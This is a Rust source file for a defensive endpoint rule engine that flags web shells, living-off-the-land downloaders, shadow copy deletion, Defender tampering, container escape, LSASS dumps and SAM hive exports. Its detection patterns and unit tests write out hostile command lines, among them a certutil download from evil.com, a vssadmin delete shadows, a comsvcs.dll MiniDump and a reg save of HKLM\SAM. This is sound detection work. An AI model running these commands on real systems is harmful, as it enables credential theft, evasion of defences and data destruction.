//! Declarative behavioral rule engine (Falco/Sigma style) for process events.
//!
//! Evaluates normalized [`ProcessEvent`] streams from Linux eBPF/audit and
//! Windows ETW against high-confidence behavioral patterns:
//! * Shell spawned by a network/web service (web shell execution).
//! * Executing unbacked binaries from temporary paths (`/tmp`, `/dev/shm`, `%TEMP%`).
//! * Living-off-the-land downloaders (`certutil -urlcache`, `bitsadmin`, `powershell -enc`).
//! * Anti-ransomware recovery tampering (`vssadmin delete shadows`, `bcdedit recovery`).

use aegis_core::{Detection, ProcessEvent, ProcessEventKind, Severity, ThreatClass};
use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum MatchCondition {
    /// Shell spawned by a web server or network service
    ShellSpawnedByNetworkService,
    /// Binary executed from temporary or world-writable paths
    ExecFromTempPath,
    /// Suspicious downloader / living-off-the-land command
    SuspiciousDownloader,
    /// Anti-forensics / shadow copy / recovery tampering
    RecoveryTampering,
    /// Defender exclusion or security tampering (DarkGate / Lumma / Ransomware)
    DefenderTampering,
    /// Container breakout via leaked file descriptors (CVE-2024-21626 Leaky Vessels)
    ContainerEscape,
    /// Script / remote execution via mshta.exe
    MshtaExecution,
    /// LSASS memory dump attempt (comsvcs.dll MiniDump or procdump lsass)
    LsassDump,
    /// Security / SAM registry hive dump (credential extraction)
    RegistryHiveSave,
    /// Accessibility backdoor tampering (StickyKeys / Utilman replacement)
    StickyKeysHijack,
    /// Parent and child binary name match
    ParentChildMatch { parent: String, child: String },
    /// Custom command line regex pattern
    CmdlinePattern { pattern: String },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BehaviorRule {
    pub name: String,
    pub description: String,
    pub severity: Severity,
    pub class: ThreatClass,
    pub condition: MatchCondition,
}

pub struct BehaviorRuleEngine {
    rules: Vec<BehaviorRule>,
}

impl Default for BehaviorRuleEngine {
    fn default() -> Self {
        Self::with_default_rules()
    }
}

impl BehaviorRuleEngine {
    pub fn new(rules: Vec<BehaviorRule>) -> Self {
        Self { rules }
    }

    pub fn default_rules() -> Self {
        Self::with_default_rules()
    }

    pub fn with_default_rules() -> Self {
        let rules = vec![
            BehaviorRule {
                name: "Behavior.WebShell.Spawn".into(),
                description: "Web/Network service spawned an interactive command shell (web shell/RCE)".into(),
                severity: Severity::Critical,
                class: ThreatClass::ReverseShell,
                condition: MatchCondition::ShellSpawnedByNetworkService,
            },
            BehaviorRule {
                name: "Behavior.Exec.TempDirectory".into(),
                description: "Executable launched from temporary or shared memory directory".into(),
                severity: Severity::High,
                class: ThreatClass::Behavioral,
                condition: MatchCondition::ExecFromTempPath,
            },
            BehaviorRule {
                name: "Behavior.Downloader.LivingOffTheLand".into(),
                description: "Living-off-the-land downloader utility invoked (certutil, bitsadmin, or pipe to shell)".into(),
                severity: Severity::High,
                class: ThreatClass::Behavioral,
                condition: MatchCondition::SuspiciousDownloader,
            },
            BehaviorRule {
                name: "Behavior.Ransomware.ShadowCopyDeletion".into(),
                description: "Command attempted to destroy system restore points or shadow copies".into(),
                severity: Severity::Critical,
                class: ThreatClass::Ransomware,
                condition: MatchCondition::RecoveryTampering,
            },
            BehaviorRule {
                name: "Behavior.Defender.ExclusionTampering".into(),
                description: "Attempted to add Defender exclusions or disable real-time monitoring (DarkGate / Lumma evasion)".into(),
                severity: Severity::Critical,
                class: ThreatClass::Rootkit,
                condition: MatchCondition::DefenderTampering,
            },
            BehaviorRule {
                name: "Behavior.ContainerEscape.LeakyVessels".into(),
                description: "Execution referencing /proc/self/fd/ leaked descriptor (CVE-2024-21626 container breakout)".into(),
                severity: Severity::Critical,
                class: ThreatClass::Behavioral,
                condition: MatchCondition::ContainerEscape,
            },
            BehaviorRule {
                name: "Behavior.LOLBin.Mshta".into(),
                description: "mshta.exe executing inline script protocol or remote payload".into(),
                severity: Severity::High,
                class: ThreatClass::Behavioral,
                condition: MatchCondition::MshtaExecution,
            },
            BehaviorRule {
                name: "Behavior.CredentialTheft.ComsvcsDump".into(),
                description: "Attempted to dump LSASS process memory via comsvcs.dll or procdump".into(),
                severity: Severity::Critical,
                class: ThreatClass::Behavioral,
                condition: MatchCondition::LsassDump,
            },
            BehaviorRule {
                name: "Behavior.CredentialTheft.RegistryHiveDump".into(),
                description: "Attempted to export SAM, SYSTEM, or SECURITY hive for offline hash cracking".into(),
                severity: Severity::Critical,
                class: ThreatClass::Behavioral,
                condition: MatchCondition::RegistryHiveSave,
            },
            BehaviorRule {
                name: "Behavior.Persistence.StickyKeys".into(),
                description: "Attempted to tamper with Windows accessibility binaries (sethc.exe / utilman.exe backdoor)".into(),
                severity: Severity::Critical,
                class: ThreatClass::Rootkit,
                condition: MatchCondition::StickyKeysHijack,
            },
        ];
        Self { rules }
    }

    /// Evaluate a process event and its optional parent process image.
    pub fn evaluate(&self, event: &ProcessEvent, parent_exe: Option<&Path>) -> Vec<Detection> {
        let mut detections = Vec::new();
        if event.kind != ProcessEventKind::Exec {
            return detections;
        }

        let cmdline_str = event.cmdline.join(" ");
        let cmdline_lower = cmdline_str.to_ascii_lowercase();
        let exe_lower = event.exe.to_string_lossy().to_ascii_lowercase();
        let exe_name = event
            .exe
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        let parent_name = parent_exe
            .and_then(|p| p.file_name())
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        for rule in &self.rules {
            let matched = match &rule.condition {
                MatchCondition::ShellSpawnedByNetworkService => {
                    let is_shell = matches!(
                        exe_name.as_str(),
                        "sh" | "bash" | "zsh" | "dash" | "cmd.exe" | "powershell.exe" | "pwsh.exe"
                    );
                    let is_net_parent = matches!(
                        parent_name.as_str(),
                        "nginx"
                            | "apache2"
                            | "httpd"
                            | "lighttpd"
                            | "caddy"
                            | "gunicorn"
                            | "uwsgi"
                            | "tomcat"
                            | "w3wp.exe"
                            | "sqlservr.exe"
                            | "mysqld"
                            | "postgres"
                    );
                    is_shell && is_net_parent
                }

                MatchCondition::ExecFromTempPath => {
                    exe_lower.contains("/tmp/")
                        || exe_lower.contains("/dev/shm/")
                        || exe_lower.contains("/run/shm/")
                        || exe_lower.contains("\\appdata\\local\\temp")
                        || exe_lower.contains("\\windows\\temp")
                }

                MatchCondition::SuspiciousDownloader => {
                    (cmdline_lower.contains("certutil") && cmdline_lower.contains("-urlcache"))
                        || (cmdline_lower.contains("bitsadmin") && cmdline_lower.contains("/transfer"))
                        || (cmdline_lower.contains("powershell") && (cmdline_lower.contains("downloadstring") || cmdline_lower.contains("-enc ")))
                        || ((cmdline_lower.contains("curl") || cmdline_lower.contains("wget"))
                            && (cmdline_lower.contains("| sh") || cmdline_lower.contains("| bash") || cmdline_lower.contains("| python")))
                }

                MatchCondition::RecoveryTampering => {
                    (cmdline_lower.contains("vssadmin") && cmdline_lower.contains("delete") && cmdline_lower.contains("shadows"))
                        || (cmdline_lower.contains("wmic") && cmdline_lower.contains("shadowcopy") && cmdline_lower.contains("delete"))
                        || (cmdline_lower.contains("wbadmin") && cmdline_lower.contains("delete") && cmdline_lower.contains("catalog"))
                        || (cmdline_lower.contains("bcdedit") && cmdline_lower.contains("recoveryenabled") && cmdline_lower.contains("no"))
                }

                MatchCondition::DefenderTampering => {
                    (cmdline_lower.contains("add-mppreference") && (cmdline_lower.contains("-exclusionpath") || cmdline_lower.contains("-exclusionprocess")))
                        || (cmdline_lower.contains("set-mppreference") && cmdline_lower.contains("-disablerealtimemonitoring"))
                }

                MatchCondition::ContainerEscape => {
                    cmdline_lower.contains("/proc/self/fd/")
                        || cmdline_lower.contains("/proc/thread-self/fd/")
                }

                MatchCondition::MshtaExecution => {
                    (exe_name == "mshta.exe" || exe_name == "mshta")
                        && (cmdline_lower.contains("vbscript:") || cmdline_lower.contains("javascript:") || cmdline_lower.contains("http://") || cmdline_lower.contains("https://"))
                }

                MatchCondition::LsassDump => {
                    (cmdline_lower.contains("comsvcs.dll") && cmdline_lower.contains("minidump"))
                        || (cmdline_lower.contains("procdump") && cmdline_lower.contains("lsass"))
                        || (cmdline_lower.contains("rundll32") && cmdline_lower.contains("#24"))
                }

                MatchCondition::RegistryHiveSave => {
                    cmdline_lower.contains("reg") && cmdline_lower.contains("save")
                        && (cmdline_lower.contains("hklm\\sam") || cmdline_lower.contains("hklm\\system") || cmdline_lower.contains("hklm\\security"))
                }

                MatchCondition::StickyKeysHijack => {
                    (cmdline_lower.contains("sethc.exe") || cmdline_lower.contains("utilman.exe"))
                        && (cmdline_lower.contains("copy") || cmdline_lower.contains("xcopy") || cmdline_lower.contains("move") || cmdline_lower.contains("reg add"))
                }

                MatchCondition::ParentChildMatch { parent, child } => {
                    parent_name == parent.to_ascii_lowercase()
                        && exe_name == child.to_ascii_lowercase()
                }

                MatchCondition::CmdlinePattern { pattern } => {
                    cmdline_lower.contains(&pattern.to_ascii_lowercase())
                }
            };

            if matched {
                let (weight, conf) = match rule.severity {
                    Severity::Critical => (1.0, 0.95),
                    Severity::High => (0.9, 0.9),
                    Severity::Medium => (0.7, 0.7),
                    Severity::Low => (0.4, 0.4),
                    Severity::Clean => (0.0, 0.0),
                };

                detections.push(Detection::with_scores(
                    "Behavior",
                    rule.name.clone(),
                    rule.severity,
                    rule.class,
                    format!("{}: PID {} ({}) invoked: {}", rule.description, event.pid, exe_name, cmdline_str),
                    weight,
                    conf,
                ));
            }
        }

        detections
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn detects_webshell_spawn() {
        let engine = BehaviorRuleEngine::default_rules();
        let ev = ProcessEvent {
            pid: 1001,
            ppid: 500,
            exe: PathBuf::from("/bin/bash"),
            cmdline: vec!["/bin/bash".into(), "-i".into()],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 1000,
        };
        let parent = Path::new("/usr/sbin/nginx");
        let detections = engine.evaluate(&ev, Some(parent));
        assert_eq!(detections.len(), 1);
        assert_eq!(detections[0].threat, "Behavior.WebShell.Spawn");
        assert_eq!(detections[0].severity, Severity::Critical);
    }

    #[test]
    fn detects_certutil_urlcache_downloader() {
        let engine = BehaviorRuleEngine::default_rules();
        let ev = ProcessEvent {
            pid: 2002,
            ppid: 100,
            exe: PathBuf::from("C:\\Windows\\System32\\certutil.exe"),
            cmdline: vec![
                "certutil.exe".into(),
                "-urlcache".into(),
                "-split".into(),
                "-f".into(),
                "http://evil.com/x.exe".into(),
            ],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 2000,
        };
        let detections = engine.evaluate(&ev, None);
        assert!(detections
            .iter()
            .any(|d| d.threat == "Behavior.Downloader.LivingOffTheLand"));
    }

    #[test]
    fn detects_shadow_copy_tampering() {
        let engine = BehaviorRuleEngine::default_rules();
        let ev = ProcessEvent {
            pid: 3003,
            ppid: 100,
            exe: PathBuf::from("vssadmin.exe"),
            cmdline: vec!["vssadmin".into(), "delete".into(), "shadows".into(), "/all".into(), "/quiet".into()],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 3000,
        };
        let detections = engine.evaluate(&ev, None);
        assert!(detections
            .iter()
            .any(|d| d.threat == "Behavior.Ransomware.ShadowCopyDeletion"));
    }

    #[test]
    fn detects_defender_exclusion_tampering() {
        let engine = BehaviorRuleEngine::default_rules();
        let ev = ProcessEvent {
            pid: 4004,
            ppid: 100,
            exe: PathBuf::from("powershell.exe"),
            cmdline: vec!["powershell.exe".into(), "-Command".into(), "Add-MpPreference -ExclusionPath 'C:\\Temp'".into()],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 4000,
        };
        let detections = engine.evaluate(&ev, None);
        assert!(detections
            .iter()
            .any(|d| d.threat == "Behavior.Defender.ExclusionTampering"));
    }

    #[test]
    fn detects_leaky_vessels_container_breakout() {
        let engine = BehaviorRuleEngine::default_rules();
        let ev = ProcessEvent {
            pid: 5005,
            ppid: 1,
            exe: PathBuf::from("/bin/sh"),
            cmdline: vec!["/bin/sh".into(), "-c".into(), "cd /proc/self/fd/7 && cat /etc/shadow".into()],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 5000,
        };
        let detections = engine.evaluate(&ev, None);
        assert!(detections
            .iter()
            .any(|d| d.threat == "Behavior.ContainerEscape.LeakyVessels"));
    }

    #[test]
    fn detects_lsass_dump_and_hive_save() {
        let engine = BehaviorRuleEngine::default_rules();
        let ev1 = ProcessEvent {
            pid: 6006,
            ppid: 100,
            exe: PathBuf::from("rundll32.exe"),
            cmdline: vec!["rundll32.exe".into(), "C:\\Windows\\System32\\comsvcs.dll".into(), "MiniDump".into(), "724".into()],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 6000,
        };
        let d1 = engine.evaluate(&ev1, None);
        assert!(d1.iter().any(|d| d.threat == "Behavior.CredentialTheft.ComsvcsDump"));

        let ev2 = ProcessEvent {
            pid: 7007,
            ppid: 100,
            exe: PathBuf::from("reg.exe"),
            cmdline: vec!["reg".into(), "save".into(), "HKLM\\SAM".into(), "sam.save".into()],
            kind: ProcessEventKind::Exec,
            timestamp_ms: 7000,
        };
        let d2 = engine.evaluate(&ev2, None);
        assert!(d2.iter().any(|d| d.threat == "Behavior.CredentialTheft.RegistryHiveDump"));
    }
}
